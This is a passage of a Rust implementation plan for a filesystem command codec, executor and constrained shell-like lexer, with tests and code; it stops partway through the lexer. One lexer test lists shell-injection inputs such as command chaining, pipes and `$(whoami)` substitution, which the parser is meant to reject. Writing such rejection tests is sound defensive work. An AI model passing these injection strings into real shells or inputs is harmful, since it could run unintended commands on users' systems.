# fslite-command & fslite-cli Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `fslite-command` (a typed operation codec covering all 28 `fslite_core::FileSystem` operations, a constrained shell-like parser/renderer, and local/remote executors) and `fslite-cli` (the binary wrapping it in one-shot and REPL modes), so a human or script can drive any `FileSystem` backend — in-process or over `fslite-server`'s HTTP contract — from a terminal.

**Architecture:** `Command`/`CommandOutput` are plain serde-able enums, one variant per trait operation (plus `Batch`, wrapping `fslite_core::BatchOperation` verbatim). An `Executor` trait (`async fn execute(&self, ctx: &RequestContext, command: Command) -> FsResult<CommandOutput>`) has two implementations: `LocalExecutor` (wraps `Arc<dyn FileSystem>`, calls trait methods directly) and `RemoteExecutor` (wraps a `reqwest::Client` + base URL, translates each `Command` into the exact HTTP contract defined in the companion `fslite-server` plan). A hand-written lexer/parser turns one line of constrained, non-shell text into a `Command`; a renderer turns a `CommandOutput` back into either human-readable lines or `--json`. `fslite-cli` is a thin binary: `clap` parses process-level flags (mode, connection info), then either runs one line from argv or loops reading stdin lines through the same parser.

**Tech Stack:** `fslite-core` (frozen), `fslite-command`'s own hand-written lexer/parser (no external parser-combinator library — see Task 3's rationale), `reqwest` (remote executor + e2e tests), `clap` (outer CLI argv only, never the per-command grammar), existing workspace deps (`serde`, `serde_json`, `base64`, `tokio`, `bytes`, `futures`, `async-trait`).

## Global Constraints

- Do not modify `fslite-core` or `fslite-sqlite`. Both are frozen (see `main/README.md`).
- `fslite-command`'s parser must never invoke a real shell (no `std::process::Command`, no `sh -c`, no environment-variable or glob expansion). This is a hard security boundary, verified by a structural test in Task 5, not just documented.
- The parser is line-oriented and constrained: no pipes (`|`), redirection (`<`/`>`), command chaining (`;`, `&&`, `||`), backgrounding (`&`), command substitution (`` ` ``/`$()`), globbing, or `$VAR`/`~` expansion. Any of these appearing unquoted at a token boundary is a parse error, not silently-literal text — the parser must fail loudly rather than guess intent (Task 4).
- Every path argument is fed through `fslite_core::VirtualPath::parse`/`LinkTarget::parse`; the parser relies on those functions' existing containment guarantees and must not re-implement path traversal checks.
- The renderer must sanitize untrusted string fields (node names, attribute keys, paths) before writing them to a real terminal: strip ASCII control bytes and ANSI escape sequences (`\x1b`) to prevent terminal-escape-sequence injection from attacker-controlled filenames (Task 6).
- `Command`/`CommandOutput` byte payloads (`Write`/`WriteAt`/`Append` bodies, `Read`'s output bytes) are bounded, in-memory `Vec<u8>` — this codec is for CLI use, not a high-throughput streaming transport. Document this trade-off in `command.rs`'s module docs; do not build unbounded-memory workarounds.
- This plan's Task 7 (`RemoteExecutor`) and Task 9 (remote e2e tests) depend on `fslite-server`'s HTTP contract existing (see `docs/superpowers/plans/2026-07-26-fslite-server.md`). Tasks 1–6, 8 (local-mode CLI + e2e), and the local half of Task 8 do not depend on it and can be implemented first.
- Keep the repo green throughout: `cargo fmt --all --check`, `cargo clippy --workspace --all-targets --all-features -- -D warnings`, and `cargo test --workspace --all-features` must all pass after every task's commit.
- New workspace dependencies are added once, to the root `Cargo.toml`'s `[workspace.dependencies]` table.

---

## `Command` / `CommandOutput` coverage table

One `Command` variant per `FileSystem` trait method (28) plus `Batch`, and one verb in the line grammar per variant (`batch` reads a JSON file rather than fitting the grammar, per the rationale in Task 4).

| Verb | `Command` variant | Trait call |
| --- | --- | --- |
| `usage` | `WorkspaceUsage` | `workspace_usage` |
| `stat` | `Stat { path, options }` | `stat` |
| `exists` | `Exists { path, options }` | `exists` |
| `ls` | `ReadDir { path, page }` | `read_dir` |
| `tree` | `Tree { path, options, page }` | `tree` |
| `mkdir` | `Mkdir { path, options }` | `mkdir` |
| `cat` | `Read { path, options }` | `read` |
| `write` | `Write { path, bytes, options }` | `write` |
| `write-at` | `WriteAt { path, offset, bytes, options }` | `write_at` |
| `append` | `Append { path, bytes, options }` | `append` |
| `truncate` | `Truncate { path, length, options }` | `truncate` |
| `touch` | `Touch { path, options }` | `touch` |
| `cp` | `Copy { from, to, options }` | `copy` |
| `mv` | `Move { from, to, options }` | `move_path` |
| `rm` | `Remove { path, options }` | `remove` |
| `ln` | `Symlink { target, link, options }` | `symlink` |
| `readlink` | `ReadLink { path }` | `read_link` |
| `trash` | `Trash { path, options }` | `trash` |
| `trash-ls` | `ListTrash { page }` | `list_trash` |
| `restore` | `Restore { trash, destination, options }` | `restore` |
| `purge` | `Purge { trash }` | `purge` |
| `setattr` | `SetAttribute { path, key, value, options }` | `set_attribute` |
| `rmattr` | `RemoveAttribute { path, key, options }` | `remove_attribute` |
| `glob` | `Glob { pattern, page }` | `glob` |
| `find` | `Find { query, page }` | `find` |
| `grep` | `SearchContent { query, page }` | `search_content` |
| `changes` | `Changes { after, page }` | `changes` |
| `batch` | `Batch(Vec<BatchOperation>)` | `batch` |

---

## Task 1: `fslite-command` scaffold + typed `Command`/`CommandOutput` codec

**Files:**
- Modify: `main/Cargo.toml` (workspace members + new `[workspace.dependencies]` entries)
- Create: `main/crates/fslite-command/Cargo.toml`
- Create: `main/crates/fslite-command/src/lib.rs`
- Create: `main/crates/fslite-command/src/bytes_b64.rs`
- Create: `main/crates/fslite-command/src/command.rs`
- Create: `main/crates/fslite-command/src/output.rs`
- Test: `main/crates/fslite-command/tests/codec.rs`

**Interfaces:**
- Produces: `pub enum Command { .. }` and `pub enum CommandOutput { .. }` exactly per the coverage table above, both `#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]`, using `#[serde(with = "bytes_b64")]` on every raw-bytes field so the JSON codec is base64, not array-of-numbers. `pub mod bytes_b64` with `pub fn serialize`/`pub fn deserialize` functions matching serde's `with` module contract.

- [ ] **Step 1: Add workspace members and dependencies**

Edit `main/Cargo.toml`'s `[workspace]` members to add `"crates/fslite-command"` and `"crates/fslite-cli"`, and add to `[workspace.dependencies]` (skip any entry already present from the `fslite-server` plan):

```toml
clap = { version = "4", features = ["derive"] }
reqwest = { version = "0.12", default-features = false, features = ["json", "rustls-tls"] }
```

- [ ] **Step 2: Write the crate manifest**

Create `main/crates/fslite-command/Cargo.toml`:

```toml
[package]
name = "fslite-command"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true
license.workspace = true

[dependencies]
async-trait.workspace = true
base64.workspace = true
bytes.workspace = true
fslite-core = { path = "../fslite-core" }
futures.workspace = true
reqwest.workspace = true
serde.workspace = true
serde_json.workspace = true

[dev-dependencies]
fslite-sqlite = { path = "../fslite-sqlite" }
tokio = { workspace = true, features = ["full"] }
```

- [ ] **Step 3: Write the failing test**

Create `main/crates/fslite-command/tests/codec.rs`:

```rust
use fslite_command::{Command, CommandOutput};
use fslite_core::{ReadOptions, StatOptions, VirtualPath, WriteOptions};

#[test]
fn stat_round_trips_through_json() {
    let command = Command::Stat {
        path: VirtualPath::parse("/a.txt").unwrap(),
        options: StatOptions::default(),
    };
    let json = serde_json::to_string(&command).unwrap();
    let back: Command = serde_json::from_str(&json).unwrap();
    assert_eq!(command, back);
}

#[test]
fn write_encodes_its_payload_as_base64_not_a_number_array() {
    let command = Command::Write {
        path: VirtualPath::parse("/a.txt").unwrap(),
        bytes: b"\x00\x01binary".to_vec(),
        options: WriteOptions::default(),
    };
    let json = serde_json::to_value(&command).unwrap();
    let bytes_field = &json["write"]["bytes"];
    assert!(bytes_field.is_string(), "expected base64 string, got {bytes_field:?}");
}

#[test]
fn read_options_round_trip_with_a_byte_range() {
    let command = Command::Read {
        path: VirtualPath::parse("/a.txt").unwrap(),
        options: ReadOptions::default().range(Some(fslite_core::ByteRange::new(0, 10))),
    };
    let json = serde_json::to_string(&command).unwrap();
    let back: Command = serde_json::from_str(&json).unwrap();
    assert_eq!(command, back);
}

#[test]
fn command_output_content_round_trips_bytes_as_base64() {
    let output = CommandOutput::Content {
        logical_length: 5,
        revision: fslite_core::Revision::INITIAL,
        range: fslite_core::ByteRange::new(0, 5),
        bytes: b"hello".to_vec(),
    };
    let json = serde_json::to_value(&output).unwrap();
    assert!(json["content"]["bytes"].is_string());
    let back: CommandOutput = serde_json::from_value(json).unwrap();
    assert_eq!(output, back);
}

#[test]
fn batch_wraps_core_batch_operations_verbatim() {
    let ops = vec![fslite_core::BatchOperation::Mkdir {
        path: VirtualPath::parse("/a").unwrap(),
        options: Default::default(),
    }];
    let command = Command::Batch(ops.clone());
    let json = serde_json::to_string(&command).unwrap();
    let back: Command = serde_json::from_str(&json).unwrap();
    assert_eq!(command, back);
}
```

- [ ] **Step 4: Run test to verify it fails**

Run: `cargo test -p fslite-command --test codec`
Expected: FAIL to compile — the `fslite_command` crate does not exist yet.

- [ ] **Step 5: Write the minimal implementation**

Create `main/crates/fslite-command/src/bytes_b64.rs`:

```rust
//! `serde(with = "bytes_b64")` helper: encodes `Vec<u8>` fields as base64
//! strings instead of serde's default JSON array-of-numbers, so the wire
//! format of every payload-carrying `Command`/`CommandOutput` variant is a
//! normal string, not a giant numeric array.

use base64::Engine;
use serde::{Deserialize, Deserializer, Serialize, Serializer};

pub fn serialize<S>(bytes: &[u8], serializer: S) -> Result<S::Ok, S::Error>
where
    S: Serializer,
{
    base64::engine::general_purpose::STANDARD
        .encode(bytes)
        .serialize(serializer)
}

pub fn deserialize<'de, D>(deserializer: D) -> Result<Vec<u8>, D::Error>
where
    D: Deserializer<'de>,
{
    let encoded = String::deserialize(deserializer)?;
    base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(serde::de::Error::custom)
}
```

Create `main/crates/fslite-command/src/command.rs`:

```rust
//! The typed operation codec: one [`Command`] variant per
//! `fslite_core::FileSystem` operation. Byte payloads are bounded, in-memory
//! `Vec<u8>` (base64 on the wire, via [`crate::bytes_b64`]) — this codec is
//! sized for CLI use, not for streaming arbitrarily large files.

use fslite_core::{
    BatchOperation, ChangeCursor, ContentQuery, CopyOptions, CreateOptions, FindQuery,
    LinkTarget, MoveOptions, MutationOptions, PageRequest, ReadOptions, RemoveOptions,
    StatOptions, TouchOptions, TrashId, TreeOptions, VirtualPath, WriteOptions,
};
use serde::{Deserialize, Serialize};

/// One typed filesystem operation, serializable for local execution,
/// remote transport, or storage as a `batch --file` script.
#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Command {
    WorkspaceUsage,
    Stat { path: VirtualPath, options: StatOptions },
    Exists { path: VirtualPath, options: StatOptions },
    ReadDir { path: VirtualPath, page: PageRequest },
    Tree { path: VirtualPath, options: TreeOptions, page: PageRequest },
    Mkdir { path: VirtualPath, options: CreateOptions },
    Read { path: VirtualPath, options: ReadOptions },
    Write {
        path: VirtualPath,
        #[serde(with = "crate::bytes_b64")]
        bytes: Vec<u8>,
        options: WriteOptions,
    },
    WriteAt {
        path: VirtualPath,
        offset: u64,
        #[serde(with = "crate::bytes_b64")]
        bytes: Vec<u8>,
        options: WriteOptions,
    },
    Append {
        path: VirtualPath,
        #[serde(with = "crate::bytes_b64")]
        bytes: Vec<u8>,
        options: WriteOptions,
    },
    Truncate { path: VirtualPath, length: u64, options: MutationOptions },
    Touch { path: VirtualPath, options: TouchOptions },
    Copy { from: VirtualPath, to: VirtualPath, options: CopyOptions },
    Move { from: VirtualPath, to: VirtualPath, options: MoveOptions },
    Remove { path: VirtualPath, options: RemoveOptions },
    Symlink { target: LinkTarget, link: VirtualPath, options: CreateOptions },
    ReadLink { path: VirtualPath },
    Trash { path: VirtualPath, options: MutationOptions },
    ListTrash { page: PageRequest },
    Restore { trash: TrashId, destination: Option<VirtualPath>, options: MutationOptions },
    Purge { trash: TrashId },
    SetAttribute {
        path: VirtualPath,
        key: String,
        #[serde(with = "crate::bytes_b64")]
        value: Vec<u8>,
        options: MutationOptions,
    },
    RemoveAttribute { path: VirtualPath, key: String, options: MutationOptions },
    Glob { pattern: String, page: PageRequest },
    Find { query: FindQuery, page: PageRequest },
    SearchContent { query: ContentQuery, page: PageRequest },
    Changes { after: Option<ChangeCursor>, page: PageRequest },
    Batch(Vec<BatchOperation>),
}
```

`ContentQuery`'s own `needle: Vec<u8>` field is not base64-wrapped here (it is a core type reused verbatim, and Task 1's constraint about base64 applies to fields `fslite-command` itself defines) — note this explicitly as an accepted inconsistency versus `fslite-server`'s `ContentQueryRequest` DTO, since `fslite-command`'s codec is consumed by Rust code (executors), not hand-written JSON, so the default `Vec<u8>` representation is not a usability problem here the way it is for an HTTP client.

Create `main/crates/fslite-command/src/output.rs`:

```rust
//! The typed operation codec's response half: one [`CommandOutput`] variant
//! per distinct `FileSystem` return shape.

use fslite_core::{
    ByteRange, Change, LinkTarget, Node, Page, Revision, SearchMatch, TreeEntry, TrashEntry,
    WorkspaceUsage,
};
use serde::{Deserialize, Serialize};

/// The typed result of executing a [`crate::Command`].
#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandOutput {
    Usage(WorkspaceUsage),
    Node(Node),
    Exists(bool),
    Nodes(Page<Node>),
    Tree(Page<TreeEntry>),
    Content {
        logical_length: u64,
        revision: Revision,
        range: ByteRange,
        #[serde(with = "crate::bytes_b64")]
        bytes: Vec<u8>,
    },
    Unit,
    LinkTarget(LinkTarget),
    Trash(TrashEntry),
    TrashList(Page<TrashEntry>),
    SearchMatches(Page<SearchMatch>),
    Changes(Page<Change>),
    Batch(Vec<fslite_core::BatchResult>),
}
```

Create `main/crates/fslite-command/src/lib.rs`:

```rust
//! A typed operation codec, constrained shell-like parser/renderer, and
//! local/remote executors for driving any `fslite_core::FileSystem` backend
//! from a command line.

mod bytes_b64;
mod command;
mod output;

pub use command::Command;
pub use output::CommandOutput;
```

- [ ] **Step 6: Run test to verify it passes**

Run: `cargo test -p fslite-command --test codec`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add Cargo.toml crates/fslite-command
git commit -m "feat(fslite-command): typed Command/CommandOutput codec"
```

---

## Task 2: `Executor` trait + `LocalExecutor`

**Files:**
- Create: `main/crates/fslite-command/src/executor.rs`
- Create: `main/crates/fslite-command/src/local.rs`
- Modify: `main/crates/fslite-command/src/lib.rs`
- Test: `main/crates/fslite-command/tests/local_executor.rs`

**Interfaces:**
- Produces: `#[async_trait] pub trait Executor { async fn execute(&self, ctx: &RequestContext, command: Command) -> FsResult<CommandOutput>; }`, `pub struct LocalExecutor { pub fs: Arc<dyn FileSystem> }` with `pub fn new(fs: Arc<dyn FileSystem>) -> Self` and a full `impl Executor for LocalExecutor` covering every `Command` variant.

- [ ] **Step 1: Write the failing test**

Create `main/crates/fslite-command/tests/local_executor.rs`:

```rust
use std::sync::Arc;

use fslite_command::{Command, CommandOutput, Executor, LocalExecutor};
use fslite_core::{FileSystem, RequestContext, VirtualPath, WriteOptions};
use fslite_sqlite::SqliteFileSystem;

async fn fixture() -> (LocalExecutor, RequestContext) {
    let fs = SqliteFileSystem::open_in_memory(Default::default()).await.unwrap();
    let workspace = fs.create_workspace(Default::default()).await.unwrap();
    let ctx = RequestContext::trusted(workspace.id);
    (LocalExecutor::new(Arc::new(fs)), ctx)
}

#[tokio::test]
async fn mkdir_then_stat_round_trips_through_the_codec() {
    let (executor, ctx) = fixture().await;
    let path = VirtualPath::parse("/docs").unwrap();

    let created = executor
        .execute(&ctx, Command::Mkdir { path: path.clone(), options: Default::default() })
        .await
        .unwrap();
    assert!(matches!(created, CommandOutput::Node(_)));

    let stat = executor
        .execute(&ctx, Command::Stat { path, options: Default::default() })
        .await
        .unwrap();
    match stat {
        CommandOutput::Node(node) => assert_eq!(node.kind, fslite_core::NodeKind::Directory),
        other => panic!("expected Node, got {other:?}"),
    }
}

#[tokio::test]
async fn write_then_read_round_trips_bytes() {
    let (executor, ctx) = fixture().await;
    let path = VirtualPath::parse("/a.txt").unwrap();

    executor
        .execute(
            &ctx,
            Command::Write { path: path.clone(), bytes: b"hello".to_vec(), options: WriteOptions::default() },
        )
        .await
        .unwrap();

    let output = executor.execute(&ctx, Command::Read { path, options: Default::default() }).await.unwrap();
    match output {
        CommandOutput::Content { bytes, logical_length, .. } => {
            assert_eq!(bytes, b"hello");
            assert_eq!(logical_length, 5);
        }
        other => panic!("expected Content, got {other:?}"),
    }
}

#[tokio::test]
async fn remove_returns_unit() {
    let (executor, ctx) = fixture().await;
    let path = VirtualPath::parse("/a.txt").unwrap();
    executor
        .execute(&ctx, Command::Write { path: path.clone(), bytes: b"x".to_vec(), options: WriteOptions::default() })
        .await
        .unwrap();

    let output = executor
        .execute(&ctx, Command::Remove { path, options: Default::default() })
        .await
        .unwrap();
    assert_eq!(output, CommandOutput::Unit);
}

#[tokio::test]
async fn batch_returns_batch_results() {
    let (executor, ctx) = fixture().await;
    let ops = vec![fslite_core::BatchOperation::Mkdir {
        path: VirtualPath::parse("/a").unwrap(),
        options: Default::default(),
    }];
    let output = executor.execute(&ctx, Command::Batch(ops)).await.unwrap();
    match output {
        CommandOutput::Batch(results) => assert_eq!(results.len(), 1),
        other => panic!("expected Batch, got {other:?}"),
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p fslite-command --test local_executor`
Expected: FAIL to compile — `Executor`/`LocalExecutor` do not exist.

- [ ] **Step 3: Write the minimal implementation**

Create `main/crates/fslite-command/src/executor.rs`:

```rust
use async_trait::async_trait;
use fslite_core::{FsResult, RequestContext};

use crate::{Command, CommandOutput};

/// Executes one typed [`Command`] against some backend, local or remote.
#[async_trait]
pub trait Executor: Send + Sync {
    /// Runs `command` under `ctx` and returns its typed result.
    async fn execute(&self, ctx: &RequestContext, command: Command) -> FsResult<CommandOutput>;
}
```

Create `main/crates/fslite-command/src/local.rs`:

```rust
use std::sync::Arc;

use async_trait::async_trait;
use fslite_core::{FileSystem, FsResult, RequestContext};
use futures::StreamExt;

use crate::executor::Executor;
use crate::{Command, CommandOutput};

/// Executes commands directly against an in-process `FileSystem` backend.
pub struct LocalExecutor {
    fs: Arc<dyn FileSystem>,
}

impl LocalExecutor {
    /// Wraps a backend for local, in-process execution.
    pub fn new(fs: Arc<dyn FileSystem>) -> Self {
        Self { fs }
    }
}

async fn drain(stream: fslite_core::ByteStream) -> FsResult<Vec<u8>> {
    let mut stream = stream;
    let mut bytes = Vec::new();
    while let Some(chunk) = stream.next().await {
        bytes.extend_from_slice(&chunk?);
    }
    Ok(bytes)
}

#[async_trait]
impl Executor for LocalExecutor {
    async fn execute(&self, ctx: &RequestContext, command: Command) -> FsResult<CommandOutput> {
        Ok(match command {
            Command::WorkspaceUsage => CommandOutput::Usage(self.fs.workspace_usage(ctx).await?),
            Command::Stat { path, options } => CommandOutput::Node(self.fs.stat(ctx, &path, options).await?),
            Command::Exists { path, options } => CommandOutput::Exists(self.fs.exists(ctx, &path, options).await?),
            Command::ReadDir { path, page } => CommandOutput::Nodes(self.fs.read_dir(ctx, &path, page).await?),
            Command::Tree { path, options, page } => CommandOutput::Tree(self.fs.tree(ctx, &path, options, page).await?),
            Command::Mkdir { path, options } => CommandOutput::Node(self.fs.mkdir(ctx, &path, options).await?),
            Command::Read { path, options } => {
                let file = self.fs.read(ctx, &path, options).await?;
                let logical_length = file.logical_length;
                let revision = file.revision;
                let range = file.range;
                let bytes = drain(file.into_stream()).await?;
                CommandOutput::Content { logical_length, revision, range, bytes }
            }
            Command::Write { path, bytes, options } => {
                let source = fslite_core::WriteSource::from_bytes(bytes);
                CommandOutput::Node(self.fs.write(ctx, &path, source, options).await?)
            }
            Command::WriteAt { path, offset, bytes, options } => {
                let source = fslite_core::WriteSource::from_bytes(bytes);
                CommandOutput::Node(self.fs.write_at(ctx, &path, offset, source, options).await?)
            }
            Command::Append { path, bytes, options } => {
                let source = fslite_core::WriteSource::from_bytes(bytes);
                CommandOutput::Node(self.fs.append(ctx, &path, source, options).await?)
            }
            Command::Truncate { path, length, options } => {
                CommandOutput::Node(self.fs.truncate(ctx, &path, length, options).await?)
            }
            Command::Touch { path, options } => CommandOutput::Node(self.fs.touch(ctx, &path, options).await?),
            Command::Copy { from, to, options } => CommandOutput::Node(self.fs.copy(ctx, &from, &to, options).await?),
            Command::Move { from, to, options } => {
                CommandOutput::Node(self.fs.move_path(ctx, &from, &to, options).await?)
            }
            Command::Remove { path, options } => {
                self.fs.remove(ctx, &path, options).await?;
                CommandOutput::Unit
            }
            Command::Symlink { target, link, options } => {
                CommandOutput::Node(self.fs.symlink(ctx, &target, &link, options).await?)
            }
            Command::ReadLink { path } => CommandOutput::LinkTarget(self.fs.read_link(ctx, &path).await?),
            Command::Trash { path, options } => CommandOutput::Trash(self.fs.trash(ctx, &path, options).await?),
            Command::ListTrash { page } => CommandOutput::TrashList(self.fs.list_trash(ctx, page).await?),
            Command::Restore { trash, destination, options } => {
                CommandOutput::Node(self.fs.restore(ctx, trash, destination.as_ref(), options).await?)
            }
            Command::Purge { trash } => {
                self.fs.purge(ctx, trash).await?;
                CommandOutput::Unit
            }
            Command::SetAttribute { path, key, value, options } => {
                CommandOutput::Node(self.fs.set_attribute(ctx, &path, &key, &value, options).await?)
            }
            Command::RemoveAttribute { path, key, options } => {
                CommandOutput::Node(self.fs.remove_attribute(ctx, &path, &key, options).await?)
            }
            Command::Glob { pattern, page } => CommandOutput::Nodes(self.fs.glob(ctx, &pattern, page).await?),
            Command::Find { query, page } => CommandOutput::Nodes(self.fs.find(ctx, query, page).await?),
            Command::SearchContent { query, page } => {
                CommandOutput::SearchMatches(self.fs.search_content(ctx, query, page).await?)
            }
            Command::Changes { after, page } => CommandOutput::Changes(self.fs.changes(ctx, after, page).await?),
            Command::Batch(operations) => CommandOutput::Batch(self.fs.batch(ctx, operations).await?),
        })
    }
}
```

Update `main/crates/fslite-command/src/lib.rs`:

```rust
mod bytes_b64;
mod command;
mod executor;
mod local;
mod output;

pub use command::Command;
pub use executor::Executor;
pub use local::LocalExecutor;
pub use output::CommandOutput;
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p fslite-command --test local_executor`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add crates/fslite-command/src crates/fslite-command/tests/local_executor.rs
git commit -m "feat(fslite-command): Executor trait and LocalExecutor"
```

---

## Task 3: Lexer (constrained tokenizer)

**Files:**
- Create: `main/crates/fslite-command/src/lexer.rs`
- Modify: `main/crates/fslite-command/src/lib.rs`
- Test: `main/crates/fslite-command/tests/lexer.rs`

A hand-written lexer (not a parser-combinator crate like `nom`) is deliberate: the grammar is deliberately tiny — whitespace tokens, two quote styles, `--flag[=value]` — and a hand-written implementation makes the security-relevant rejection paths (Task 3's own tests plus Task 5) trivially auditable line-by-line, rather than hidden inside combinator composition.

**Interfaces:**
- Produces: `pub fn tokenize(line: &str) -> Result<Vec<Token>, LexError>`, `pub enum Token { Word(String), Flag { name: String, value: Option<String> } }`, `pub enum LexError { UnterminatedQuote, InvalidEscape(char), NulByte, TooLong { max: usize, actual: usize }, UnsupportedMetacharacter(char) }`. `const MAX_LINE_LEN: usize = 65536;`.

- [ ] **Step 1: Write the failing test**

Create `main/crates/fslite-command/tests/lexer.rs`:

```rust
use fslite_command::lexer::{tokenize, LexError, Token};

#[test]
fn splits_on_unquoted_whitespace() {
    let tokens = tokenize("mkdir /docs --parents").unwrap();
    assert_eq!(
        tokens,
        vec![
            Token::Word("mkdir".into()),
            Token::Word("/docs".into()),
            Token::Flag { name: "parents".into(), value: None },
        ]
    );
}

#[test]
fn single_quotes_are_fully_literal() {
    let tokens = tokenize("write '/a b.txt'").unwrap();
    assert_eq!(tokens[1], Token::Word("/a b.txt".into()));
}

#[test]
fn single_quotes_do_not_process_backslash_escapes() {
    let tokens = tokenize(r"write '\n'").unwrap();
    assert_eq!(tokens[1], Token::Word(r"\n".into()));
}

#[test]
fn double_quotes_support_a_small_constrained_escape_set() {
    let tokens = tokenize(r#"write "line\nbreak\t\"quote\"\\""#).unwrap();
    assert_eq!(tokens[1], Token::Word("line\nbreak\t\"quote\"\\".into()));
}

#[test]
fn flag_with_inline_value() {
    let tokens = tokenize("write /a.txt --expected-revision=7").unwrap();
    assert_eq!(tokens[2], Token::Flag { name: "expected-revision".into(), value: Some("7".into()) });
}

#[test]
fn unterminated_single_quote_is_a_parse_error_not_a_hang() {
    assert_eq!(tokenize("write 'oops").unwrap_err(), LexError::UnterminatedQuote);
}

#[test]
fn unterminated_double_quote_is_a_parse_error() {
    assert_eq!(tokenize(r#"write "oops"#).unwrap_err(), LexError::UnterminatedQuote);
}

#[test]
fn nul_byte_is_rejected() {
    assert_eq!(tokenize("write /a\0b").unwrap_err(), LexError::NulByte);
}

#[test]
fn oversized_input_is_rejected_before_tokenizing() {
    let huge = "x".repeat(200_000);
    match tokenize(&huge) {
        Err(LexError::TooLong { max, actual }) => {
            assert_eq!(max, fslite_command::lexer::MAX_LINE_LEN);
            assert_eq!(actual, huge.len());
        }
        other => panic!("expected TooLong, got {other:?}"),
    }
}

#[test]
fn unquoted_shell_metacharacters_are_rejected_not_silently_literal() {
    for input in ["ls /a | rm /b", "ls /a; rm /b", "ls /a && rm /b", "ls /a > out", "ls `whoami`", "ls $(whoami)", "ls /a &"] {
        assert!(matches!(tokenize(input), Err(LexError::UnsupportedMetacharacter(_))), "expected rejection for: {input}");
    }
}

#[test]
fn dollar_and_tilde_are_never_expanded_they_are_just_literal_bytes_inside_a_word() {
    // Not at a token boundary as a metacharacter trigger — embedded inside an
    // otherwise ordinary word, `$`/`~` are inert. This proves the lexer does
    // not special-case them for expansion anywhere, only rejects the
    // shell-substitution *forms* `$(...)`/backticks tested above.
    let tokens = tokenize("write /a$HOME~b.txt").unwrap();
    assert_eq!(tokens[1], Token::Word("/a$HOME~b.txt".into()));
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p fslite-command --test lexer`
Expected: FAIL to compile — `fslite_command::lexer` does not exist.

- [ ] **Step 3: Write the minimal implementation**

Create `main/crates/fslite-command/src/lexer.rs`:

```rust
//! A deliberately tiny, hand-written tokenizer for `fslite-command`'s line
//! grammar. It is not a shell: there is no expansion of any kind (globs,
//! `$VAR`, `~`, command substitution) and no shell metacharacter (`|`, `;`,
//! `&`, `<`, `>`, backtick, `$(`) is ever treated as literal text when it
//! appears unquoted — it is rejected outright, so a user who pastes a real
//! shell command gets a clear error instead of a confusing partial parse.

/// The maximum accepted input line length, checked before any allocation
/// proportional to the input beyond the raw string itself.
pub const MAX_LINE_LEN: usize = 65536;

const REJECTED_UNQUOTED_METACHARACTERS: &[char] = &['|', ';', '&', '<', '>', '`'];

/// One lexical token: a bare word/path, or a `--flag[=value]`.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum Token {
    /// A positional argument (verb or path).
    Word(String),
    /// A `--name` or `--name=value` flag.
    Flag { name: String, value: Option<String> },
}

/// Why a line could not be tokenized.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum LexError {
    /// A `'` or `"` was opened but never closed.
    UnterminatedQuote,
    /// A `\` inside a double-quoted string preceded an unsupported character.
    InvalidEscape(char),
    /// The input contained a NUL byte.
    NulByte,
    /// The input exceeded [`MAX_LINE_LEN`], checked before tokenizing.
    TooLong { max: usize, actual: usize },
    /// An unquoted shell metacharacter appeared outside a quoted token.
    UnsupportedMetacharacter(char),
}

/// Tokenizes one line of `fslite-command` grammar.
pub fn tokenize(line: &str) -> Result<Vec<Token>, LexError> {
    if line.len() > MAX_LINE_LEN {
        return Err(LexError::TooLong { max: MAX_LINE_LEN, actual: line.len() });
    }
    if line.contains('\0') {
        return Err(LexError::NulByte);
    }
    // `$(` is checked as a two-character sequence; single '$' and '~' are
    // never rejected or expanded — see the `dollar_and_tilde_are_never_expanded` test.
    if line.contains("$(") {
        return Err(LexError::UnsupportedMetacharacter('$'));
    }

    let mut tokens = Vec::new();
    let mut chars = line.chars().peekable();

    while let Some(&ch) = chars.peek() {
        if ch.is_whitespace() {
            chars.next();
            continue;
        }
        if REJECTED_UNQUOTED_METACHARACTERS.contains(&ch) {
            return Err(LexError::UnsupportedMetacharacter(ch));
        }

        let word = read_word(&mut chars)?;
        tokens.push(classify(word));
    }

    Ok(tokens)
}

fn classify(word: String) -> Token {
    match word.strip_prefix("--") {
        Some(rest) => match rest.split_once('=') {
            Some((name, value)) => Token::Flag { name: name.to_string(), value: Some(value.to_string()) },
            None => Token::Flag { name: rest.to_string(), value: None },
        },
        None => Token::Word(word),
    }
}

fn read_word(chars: &mut std::iter::Peekable<std::str::Chars<'_>>) -> Result<String, LexError> {
    let mut word = String::new();

    while let Some(&ch) = chars.peek() {
        if ch.is_whitespace() {
            break;
        }
        if REJECTED_UNQUOTED_METACHARACTERS.contains(&ch) && !word.is_empty() {
            // A metacharacter ending a word (e.g. `foo;`) is still rejected —
            // stop and let the outer loop's boundary check on the *next*
            // iteration catch it. To fail immediately rather than silently
            // absorbing it as a separate empty word, check right here too.
            return Err(LexError::UnsupportedMetacharacter(ch));
        }

        match ch {
            '\'' => {
                chars.next();
                word.push_str(&read_single_quoted(chars)?);
            }
            '"' => {
                chars.next();
                word.push_str(&read_double_quoted(chars)?);
            }
            _ => {
                word.push(ch);
                chars.next();
            }
        }
    }

    Ok(word)
}

fn read_single_quoted(chars: &mut std::iter::Peekable<std::str::Chars<'_>>) -> Result<String, LexError> {
    let mut content = String::new();
    loop {
        match chars.next() {
            None => return Err(LexError::UnterminatedQuote),
            Some('\'') => return Ok(content),
            Some(ch) => content.push(ch),
        }
    }
}

fn read_double_quoted(chars: &mut std::iter::Peekable<std::str::Chars<'_>>) -> Result<String, LexError> {
    let mut content = String::new();
    loop {
        match chars.next() {
            None => return Err(LexError::UnterminatedQuote),
            Some('"') => return Ok(content),
            Some('\\') => match chars.next() {
                None => return Err(LexError::UnterminatedQuote),
                Some('n') => content.push('\n'),
